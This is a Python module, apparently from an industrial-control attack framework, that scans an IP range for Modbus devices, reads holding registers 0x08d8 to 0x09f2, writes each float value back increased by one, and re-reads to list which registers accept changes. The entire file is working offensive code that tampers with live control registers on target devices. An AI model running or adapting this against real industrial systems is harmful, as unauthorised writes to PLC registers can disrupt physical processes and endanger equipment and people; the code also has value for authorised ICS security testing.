import os
import threading
import struct
from time import sleep
from System.Core.Global import *
from System.Core.Colors import *
from System.Core.Modbus import *
from System.Lib import ipcalc
import math


class Module:
    info = {
        "Name": "Query Modifiable Register",
        "Author": ["maqi"],
        "Description": "Query Modifiable Register",
    }
    options = {
        "RHOSTS": ["192.168.233.74", True, "The target address range or CIDR identifier"],
        "RPORT": [21502, False, "The port number for modbus protocol"],
        "UID": [1, True, "Modbus Slave UID."],
        "Quantity": ["0x0002", True, "Registers Values."],
        "Threads": [1, False, "The number of concurrent threads"],
        "Output": [True, False, "The stdout save in output directory"],
    }
    output = ""
    address = []

    def exploit(self):

        moduleName = self.info["Name"]
        print(
            bcolors.OKBLUE + "[+]" + bcolors.ENDC + " Module " + moduleName + " Start"
        )
        ips = list()
        for ip in ipcalc.Network(self.options["RHOSTS"][0]):
            ips.append(str(ip))
        while ips:
            for i in range(int(self.options["Threads"][0])):
                if len(ips) > 0:
                    thread = threading.Thread(target=self.do, args=(ips.pop(0),))
                    thread.start()
                    THREADS.append(thread)
                else:
                    break
            for thread in THREADS:
                thread.join()
        if self.options["Output"][0]:
            open(
                mainPath
                + "/Output/"
                + moduleName
                + "_"
                + self.options["RHOSTS"][0].replace("/", "_")
                + ".txt",
                "a",
            ).write("=" * 30 + "\n" + self.output + "\n\n")
        self.output = ""

    def printLine(self, str, color):
        self.output += str + "\n"
        if str.find("[+]") != -1:
            print(str.replace("[+]", color + "[+]" + bcolors.ENDC))
        elif str.find("[-]") != -1:
            print(str.replace("[-]", color + "[+]" + bcolors.ENDC))
        else:
            print(str)

    def do(self, ip):
        c = connectToTarget(ip, self.options["RPORT"][0])
        if c == None:
            self.printLine("[-] Modbus is not running on : " + ip, bcolors.WARNING)
            return None
        self.printLine("[+] Connecting to " + ip, bcolors.OKGREEN)
        for i in range(0x08d8, 0x09f2 + 1, int(self.options["Quantity"][0], 16)):
            # 读寄存器
            ans = c.sr1(
                ModbusADU(transId=getTransId(), unitId=int(self.options["UID"][0]))
                / ModbusPDU03_Read_Holding_Registers(
                    startAddr=int(hex(i), 16),
                    quantity=int(self.options["Quantity"][0], 16),
                ),
                timeout=timeout,
                verbose=0,
            )
            ans = ModbusADU_Answer(bytes(ans))
            read_1 = struct.unpack('>f', bytes(ans)[-4:])[0]
            # 写寄存器
            write_1 = read_1 + 1
            s = bytes(struct.pack('>f', write_1))
            s = [hex(i) for i in bytes(s)]
            s = [int(i, 16) for i in s]
            # 因为刷新周期的问题，我们这里写入了两次
            for _ in range(2):
                ans = c.sr1(
                    ModbusADU(transId=getTransId(), unitId=int(self.options["UID"][0]))
                    / ModbusPDU10_Write_Multiple_Registers(
                        startingAddr=int(hex(i), 16),
                        quantityRegisters=int(self.options["Quantity"][0], 16),
                        outputsValue=s
                    ),
                    timeout=timeout,
                    verbose=0,
                )
                ans = ModbusADU_Answer(bytes(ans))
                sleep(0.2)
            # 读寄存器
            ans = c.sr1(
                ModbusADU(transId=getTransId(), unitId=int(self.options["UID"][0]))
                / ModbusPDU03_Read_Holding_Registers(
                    startAddr=int(hex(i), 16),
                    quantity=int(self.options["Quantity"][0], 16),
                ),
                timeout=timeout,
                verbose=0,
            )
            ans = ModbusADU_Answer(bytes(ans))
            read_2 = struct.unpack('>f', bytes(ans)[-4:])[0]
            print(f'read_1:{read_1},read_2:{read_2}')
            if math.fabs(write_1 - read_2) < 1e-6:
                print(f"{hex(i)} address can be modifiable!")
                self.address.append(hex(i))
        print(self.address)
        print(len(self.address))
        self.address.clear()
